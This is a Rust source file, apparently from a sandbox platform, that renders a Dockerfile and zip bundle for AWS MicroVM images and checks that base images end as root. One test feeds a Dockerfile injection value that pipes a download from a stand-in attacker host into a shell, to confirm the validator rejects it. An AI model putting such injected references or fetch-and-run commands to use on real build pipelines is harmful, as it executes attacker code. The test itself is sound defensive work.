//! The bundle a Lambda MicroVM image is built from.
//!
//! AWS builds a MicroVM image from a zip containing a Dockerfile, not from a container image
//! reference, so a declared `code.image` has to be turned into one. That is Alien's packaging
//! problem, not something a user should have to express.
//!
//! The layout is the whole security story of the image: where the agent sits, who owns it, and
//! who the untrusted code runs as.

use std::fs::File;
use std::io::Write;
use std::path::Path;

use crate::error::{ErrorData, Result};
use alien_error::AlienError;
use alien_error::{Context, IntoAlienError};
use oci_client::client::{Client as OciClient, ClientConfig as OciClientConfig};
use oci_client::manifest::OciManifest;
use oci_client::Reference;

use zip::write::SimpleFileOptions;
use zip::ZipWriter;

use alien_core::sandbox_image::{
    contract_env, entrypoint, identity_setup, AGENT_PATH, AWS_MICROVM,
};

/// Name the agent binary must have inside the bundle.
pub const AGENT_FILENAME: &str = "alien-sandbox-agent";

/// Where the agent comes from at image-build time: `Image` copies it out of a published
/// container image (no binary in the bundle, a new agent is a tag change); `Binary` embeds a
/// local build instead, for CI on the current commit and for pre-publish development.
#[derive(Debug, Clone)]
pub enum AgentSource {
    /// A published image holding the agent at [`AGENT_PATH`].
    Image(String),
    /// A local agent binary, zipped into the bundle beside the Dockerfile.
    Binary(std::path::PathBuf),
}

/// Refuses a reference that cannot cross into generated content: a newline in it writes its own
/// Dockerfile directives.
fn checked_reference<'a>(reference: &'a str, what: &str) -> Result<&'a str> {
    if reference.is_empty()
        || reference
            .chars()
            .any(|c| c.is_whitespace() || c.is_control())
    {
        return Err(AlienError::new(ErrorData::BuildConfigInvalid {
            message: format!(
                "{what} reference '{reference}' is empty or carries whitespace or control \
                 characters, which cannot cross into a generated Dockerfile"
            ),
        }));
    }
    Ok(reference)
}

/// Validates that a base image ends as root, which `Isolation::UidSplit` requires.
///
/// The agent must start as root to drop to the exec uid before every spawn. A hardened base
/// image (chainguard, distroless) that ends `USER nonroot` leaves the agent without the
/// privilege to drop, and every exec fails at runtime after the image reports healthy.
///
/// Returns an error naming the base image and its ending user if validation fails.
pub async fn validate_base_image_for_uid_split(base_image: &str) -> Result<()> {
    // Parse the image reference
    let reference = Reference::try_from(base_image)
        .into_alien_error()
        .context(ErrorData::BuildConfigInvalid {
            message: format!("Invalid base image reference '{base_image}'"),
        })?;

    // Create OCI client to pull the image manifest and config
    let client = OciClient::new(OciClientConfig {
        protocol: dockdash::ClientProtocol::HttpsExcept(vec!["localhost".to_string()]),
        ..Default::default()
    });

    // Pull the manifest
    let (manifest, _digest) = client
        .pull_manifest(&reference, &dockdash::RegistryAuth::Anonymous)
        .await
        .into_alien_error()
        .context(ErrorData::BuildConfigInvalid {
            message: format!(
                "Failed to pull manifest for base image '{base_image}'. Ensure the image exists \
                 and is accessible."
            ),
        })?;

    // Extract config descriptor from manifest
    let config_descriptor = match manifest {
        OciManifest::Image(img_manifest) => img_manifest.config,
        OciManifest::ImageIndex(_) => {
            return Err(AlienError::new(ErrorData::BuildConfigInvalid {
                message: format!(
                    "Base image '{base_image}' is a multi-arch image index. Specify a \
                     platform-specific image instead (e.g., add @sha256:... or specify an \
                     architecture-specific tag)."
                ),
            }));
        }
    };

    // Pull the config blob
    let mut config_bytes = Vec::new();
    client
        .pull_blob(&reference, &config_descriptor, &mut config_bytes)
        .await
        .into_alien_error()
        .context(ErrorData::BuildConfigInvalid {
            message: format!("Failed to pull config blob for base image '{base_image}'"),
        })?;

    // Parse the config JSON
    let config: serde_json::Value = serde_json::from_slice(&config_bytes)
        .into_alien_error()
        .context(ErrorData::BuildConfigInvalid {
            message: format!("Failed to parse config for base image '{base_image}'"),
        })?;

    // Check Config.User field
    let user = config
        .get("config")
        .and_then(|c| c.get("User"))
        .and_then(|u| u.as_str())
        .unwrap_or("");

    // Root is: empty string, "0", or "0:0"
    let is_root = user.is_empty() || user == "0" || user == "0:0" || user == "root";

    if !is_root {
        return Err(AlienError::new(ErrorData::BuildConfigInvalid {
            message: format!(
                "Base image '{base_image}' ends with USER '{user}', but AWS MicroVM sandboxes \
                 require a base image that ends as root. The agent must start as root to drop to \
                 uid {exec_uid} before each spawn. Use a base image that does not set a USER \
                 directive, or one that sets USER 0 or USER root.\n\n\
                 Common root-ending base images:\n  \
                 - public.ecr.aws/lambda/microvms:al2023-minimal\n  \
                 - ubuntu:24.04\n  \
                 - python:3.13-slim\n\n\
                 If you need a hardened base, layer your tooling on top of a root-ending base \
                 instead of using a distroless or nonroot image directly.",
                exec_uid = AWS_MICROVM.exec_uid
            ),
        }));
    }

    Ok(())
}

/// Renders the Dockerfile for a sandbox image built on `base_image`.
///
/// Everything below the base image comes from [`AWS_MICROVM`]; what is rendered here is the
/// `COPY` that installs the agent, which has no counterpart in the GCP image because the agent
/// can arrive from a published image or from the bundle itself.
pub fn dockerfile(base_image: &str, agent: &AgentSource) -> Result<String> {
    let base_image = checked_reference(base_image, "base image")?;
    // Both lines pin ownership and mode themselves: the untrusted code the agent supervises must
    // not be able to rewrite the supervisor, whichever way the agent arrived.
    let copy_agent = match agent {
        AgentSource::Image(image) => {
            let image = checked_reference(image, "agent image")?;
            format!("COPY --from={image} --chown=0:0 --chmod=0755 {AGENT_PATH} {AGENT_PATH}")
        }
        AgentSource::Binary(_) => {
            format!("COPY --chown=0:0 --chmod=0755 {AGENT_FILENAME} {AGENT_PATH}")
        }
    };

    Ok(format!(
        r#"FROM {base_image}

{copy_agent}

# Written with numeric ids and a plain append rather than useradd/adduser, which differ across
# base distributions. Linux runs a process under a uid with no passwd entry, but some tooling
# inside the sandbox reads one.
{identity}

# The full contract, in the image rather than only in the template. The ready hook runs during
# the image build, and the agent refuses to start without every one of these — so a value
# supplied only at run time leaves the build waiting on an agent that never came up.
{contract}

{entry}
"#,
        identity = identity_setup(&AWS_MICROVM),
        contract = contract_env(&AWS_MICROVM),
        entry = entrypoint(&AWS_MICROVM),
    ))
}

/// Writes the bundle AWS builds a MicroVM image from: the rendered Dockerfile, plus the agent
/// binary beside it when the agent is a local build rather than a published image.
///
/// The archive is flat on purpose — `CreateMicrovmImage` looks for the Dockerfile at the root,
/// and a nested directory produces a build failure minutes in rather than a rejected request.
///
/// Call [`validate_base_image_for_uid_split`] before this function to ensure the base image ends
/// as root, preventing a runtime failure where the image builds successfully but every command
/// fails because the agent lacks privilege to drop to the exec uid.
pub fn write_bundle(destination: &Path, base_image: &str, agent: &AgentSource) -> Result<()> {
    let failed = |operation: &str, path: &Path| ErrorData::FileOperationFailed {
        operation: operation.to_string(),
        file_path: path.display().to_string(),
        reason: "could not assemble the sandbox image bundle".to_string(),
    };

    // Every fallible input resolves before the archive exists, so no failure — a bad reference
    // or an unreadable agent binary — leaves a truncated zip behind.
    let dockerfile = dockerfile(base_image, agent)?;
    let agent_bytes = match agent {
        AgentSource::Binary(agent_binary) => Some(
            std::fs::read(agent_binary)
                .into_alien_error()
                .context(failed("read", agent_binary))?,
        ),
        AgentSource::Image(_) => None,
    };

    let archive = File::create(destination)
        .into_alien_error()
        .context(failed("create", destination))?;
    let mut zip = ZipWriter::new(archive);

    if let Some(bytes) = agent_bytes {
        // 0755 on the agent so the entry is already executable; the Dockerfile's `--chmod` covers
        // builders that drop archive modes, and neither alone is reliable across both.
        let options: SimpleFileOptions = SimpleFileOptions::default().unix_permissions(0o755);
        zip.start_file(AGENT_FILENAME, options)
            .into_alien_error()
            .context(failed("write", destination))?;
        zip.write_all(&bytes)
            .into_alien_error()
            .context(failed("write", destination))?;
    }

    zip.start_file(
        "Dockerfile",
        SimpleFileOptions::default().unix_permissions(0o644),
    )
    .into_alien_error()
    .context(failed("write", destination))?;
    zip.write_all(dockerfile.as_bytes())
        .into_alien_error()
        .context(failed("write", destination))?;

    zip.finish()
        .into_alien_error()
        .context(failed("finalize", destination))?;
    Ok(())
}

#[cfg(test)]
mod tests {
    /// The reference reaches a generated Dockerfile, so a newline in it writes directives of the
    /// caller's choosing. Both entry points render through `dockerfile`, so the refusal is here.
    #[test]
    fn an_image_reference_that_would_inject_directives_is_refused() {
        for reference in [
            "alpine\nRUN curl evil.example.com | sh",
            "alpine:3 \nFROM scratch",
            "",
            "alpine\tlatest",
        ] {
            super::dockerfile(
                reference,
                &super::AgentSource::Image("agent:v1".to_string()),
            )
            .expect_err(&format!("{reference:?} must not render into a Dockerfile"));
            super::dockerfile(
                "ubuntu:24.04",
                &super::AgentSource::Image(reference.to_string()),
            )
            .expect_err(&format!(
                "{reference:?} must not render as an agent image either"
            ));
        }

        // The control arm: an ordinary reference still renders, so the guard is not refusing
        // everything.
        let rendered = super::dockerfile(
            "public.ecr.aws/lambda/microvms:al2023-minimal",
            &super::AgentSource::Image("agent:v1".to_string()),
        )
        .expect("an ordinary reference renders");
        assert!(rendered.starts_with("FROM public.ecr.aws/lambda/microvms:al2023-minimal"));
    }

    use super::*;

    /// The properties below are the image's half of the supervisor boundary. A base image is
    /// caller-supplied, so these assertions are about what Alien adds on top of it.
    fn embedded_agent() -> AgentSource {
        AgentSource::Binary(std::path::PathBuf::from("unused-in-render"))
    }

    fn rendered() -> String {
        dockerfile(
            "public.ecr.aws/lambda/microvms:al2023-minimal",
            &embedded_agent(),
        )
        .expect("a valid reference")
    }

    #[test]
    fn the_base_image_is_the_one_asked_for() {
        assert!(rendered().starts_with("FROM public.ecr.aws/lambda/microvms:al2023-minimal\n"));
    }

    /// The escalation this prevents: untrusted code running as the exec uid overwriting the
    /// agent binary and answering in its place.
    #[test]
    fn the_agent_binary_is_root_owned_and_not_writable_by_the_exec_uid() {
        let dockerfile = rendered();
        assert!(
            dockerfile.contains(&format!(
                "COPY --chown=0:0 --chmod=0755 {AGENT_FILENAME} {AGENT_PATH}"
            )),
            "the agent must be root-owned and mode 0755:\n{dockerfile}"
        );
    }

    /// 0700 and owned by the exec uid: the session's own files are readable only by the code
    /// that created them, not by anything else the base image happens to run.
    #[test]
    fn the_session_root_belongs_to_the_exec_uid_alone() {
        let dockerfile = rendered();
        let (uid, root) = (AWS_MICROVM.exec_uid, AWS_MICROVM.session_root);
        assert!(dockerfile.contains(&format!("chown {uid}:{uid} {root}")));
        assert!(dockerfile.contains(&format!("chmod 0700 {root}")));
    }

    /// The agent refuses to start without these, so an image that omits them is a sandbox that
    /// never runs. Baking them in means the template and the image cannot disagree.
    #[test]
    fn the_agent_contract_is_baked_into_the_image() {
        let dockerfile = rendered();
        let (uid, root) = (AWS_MICROVM.exec_uid, AWS_MICROVM.session_root);
        for expected in [
            &format!("ALIEN_SANDBOX_ROOT={root}"),
            &format!("ALIEN_SANDBOX_EXEC_UID={uid}"),
            &format!("ALIEN_SANDBOX_EXEC_GID={uid}"),
            &"ALIEN_SANDBOX_AUTHORIZATION=transport".to_string(),
            &"ALIEN_SANDBOX_ISOLATION=uid-split".to_string(),
        ] {
            assert!(dockerfile.contains(expected.as_str()), "missing {expected}");
        }
    }

    /// A shell would re-parse the path and give the sandbox a process it did not ask for.
    #[test]
    fn the_entrypoint_is_exec_form() {
        assert!(rendered().contains(&format!(r#"ENTRYPOINT ["{AGENT_PATH}"]"#)));
    }

    /// The Terraform and CloudFormation emitters each repeat the exec uid as a literal of their
    /// own, because a `&'static str` cannot be derived from the contract in a const. This pins the
    /// value those two are asserted against.
    #[test]
    fn the_exec_uid_is_unprivileged() {
        assert_ne!(AWS_MICROVM.exec_uid, 0, "the exec uid must never be root");
        assert_eq!(AWS_MICROVM.exec_uid, 60000);
    }

    /// The archive has to be flat and contain both entries: `CreateMicrovmImage` looks for the
    /// Dockerfile at the root, and a nested layout fails minutes into a build instead of being
    /// rejected up front.
    #[test]
    fn the_bundle_is_flat_and_carries_both_entries() {
        let dir = tempfile::TempDir::new().expect("temp dir");
        let agent = dir.path().join("agent-bin");
        std::fs::write(&agent, b"\x7fELF-not-really").expect("agent");
        let bundle = dir.path().join("sandbox.zip");

        write_bundle(&bundle, "ubuntu:24.04", &AgentSource::Binary(agent))
            .expect("writes the bundle");

        let file = std::fs::File::open(&bundle).expect("opens");
        let mut archive = zip::ZipArchive::new(file).expect("reads as a zip");

        let mut names: Vec<String> = (0..archive.len())
            .map(|i| archive.by_index(i).expect("entry").name().to_string())
            .collect();
        names.sort();
        assert_eq!(names, vec!["Dockerfile", AGENT_FILENAME]);

        for name in &names {
            assert!(
                !name.contains('/'),
                "the archive must be flat, found '{name}'"
            );
        }

        let mut dockerfile_entry = archive.by_name("Dockerfile").expect("Dockerfile entry");
        let mut contents = String::new();
        std::io::Read::read_to_string(&mut dockerfile_entry, &mut contents).expect("reads");
        assert!(contents.starts_with("FROM ubuntu:24.04"));
    }

    /// Image-sourced bundles carry no agent binary: the zip holds only the Dockerfile.
    #[test]
    fn an_image_sourced_bundle_carries_only_the_dockerfile() {
        let dir = tempfile::TempDir::new().expect("temp dir");
        let bundle = dir.path().join("sandbox.zip");

        write_bundle(
            &bundle,
            "ubuntu:24.04",
            &AgentSource::Image("public.ecr.aws/acme/sandbox-agent:v1".to_string()),
        )
        .expect("writes the bundle");

        let file = std::fs::File::open(&bundle).expect("opens");
        let mut archive = zip::ZipArchive::new(file).expect("zip");
        assert_eq!(archive.len(), 1, "nothing but the Dockerfile belongs here");

        let mut dockerfile = String::new();
        std::io::Read::read_to_string(
            &mut archive.by_name("Dockerfile").expect("dockerfile entry"),
            &mut dockerfile,
        )
        .expect("reads");
        assert!(
            dockerfile.contains(&format!(
                "COPY --from=public.ecr.aws/acme/sandbox-agent:v1 \
                 --chown=0:0 --chmod=0755 {AGENT_PATH} {AGENT_PATH}"
            )) || dockerfile.contains(&format!(
                "COPY --from=public.ecr.aws/acme/sandbox-agent:v1 --chown=0:0 --chmod=0755 {AGENT_PATH} {AGENT_PATH}"
            )),
            "the agent must be copied out of the named image, root-owned and 0755:\n{dockerfile}"
        );
        assert!(
            !dockerfile.contains(&format!("COPY --chown=0:0 --chmod=0755 {AGENT_FILENAME} ")),
            "the local-file COPY must not appear when the agent comes from an image"
        );
    }

    /// A failed input must leave nothing at the destination — a truncated zip uploaded by a
    /// caller that only checked the exit path fails ~160s into an image build instead of here.
    #[test]
    fn a_missing_agent_binary_leaves_no_bundle_behind() {
        let dir = tempfile::TempDir::new().expect("temp dir");
        let bundle = dir.path().join("sandbox.zip");

        write_bundle(
            &bundle,
            "ubuntu:24.04",
            &AgentSource::Binary(dir.path().join("does-not-exist")),
        )
        .expect_err("an unreadable agent must fail the bundle");

        assert!(
            !bundle.exists(),
            "no partial archive may be left at the destination"
        );
    }

    /// The agent entry must survive as an executable. A builder that honours archive modes and
    /// one that does not both have to produce a runnable binary, which is why the Dockerfile
    /// also carries `--chmod`.
    #[test]
    fn the_agent_entry_is_executable() {
        let dir = tempfile::TempDir::new().expect("temp dir");
        let agent = dir.path().join("agent-bin");
        std::fs::write(&agent, b"binary").expect("agent");
        let bundle = dir.path().join("sandbox.zip");
        write_bundle(&bundle, "ubuntu:24.04", &AgentSource::Binary(agent)).expect("writes");

        let file = std::fs::File::open(&bundle).expect("opens");
        let mut archive = zip::ZipArchive::new(file).expect("zip");
        let entry = archive.by_name(AGENT_FILENAME).expect("agent entry");
        assert_eq!(
            entry.unix_mode().map(|mode| mode & 0o777),
            Some(0o755),
            "the agent entry must be executable in the archive"
        );
    }

    /// Validate that a root-ending base image (ubuntu:24.04) passes validation.
    ///
    /// Requires network access to pull the image manifest. Verifies the regression prevention:
    /// a customer using a standard root-ending base is not blocked.
    #[tokio::test]
    #[ignore = "requires network access to docker.io"]
    async fn a_root_ending_base_image_passes_validation() {
        super::validate_base_image_for_uid_split("ubuntu:24.04")
            .await
            .expect("ubuntu:24.04 ends as root and should pass validation");
    }

    /// Validate that a non-root base image (chainguard/wolfi-base) fails with a clear message.
    ///
    /// Requires network access to pull the image manifest. Verifies the core issue: a hardened
    /// base that ends USER nonroot is caught at build time with a message naming the base image
    /// and explaining how to fix it.
    #[tokio::test]
    #[ignore = "requires network access to docker.io"]
    async fn a_nonroot_base_image_fails_validation() {
        let result = super::validate_base_image_for_uid_split("cgr.dev/chainguard/wolfi-base")
            .await;

        let error = result.expect_err("chainguard/wolfi-base ends as nonroot and must be rejected");
        let message = format!("{error}");

        // The error must name the base image
        assert!(
            message.contains("cgr.dev/chainguard/wolfi-base"),
            "error should name the base image that failed: {message}"
        );

        // The error must explain that the image ends as non-root
        assert!(
            message.contains("USER") || message.contains("nonroot") || message.contains("65532"),
            "error should mention the USER issue: {message}"
        );

        // The error must explain that root is required
        assert!(
            message.contains("root") && message.contains("uid"),
            "error should explain that root is required: {message}"
        );

        // The error should suggest alternatives
        assert!(
            message.contains("Use a base") || message.contains("base image"),
            "error should suggest using a different base: {message}"
        );
    }
}
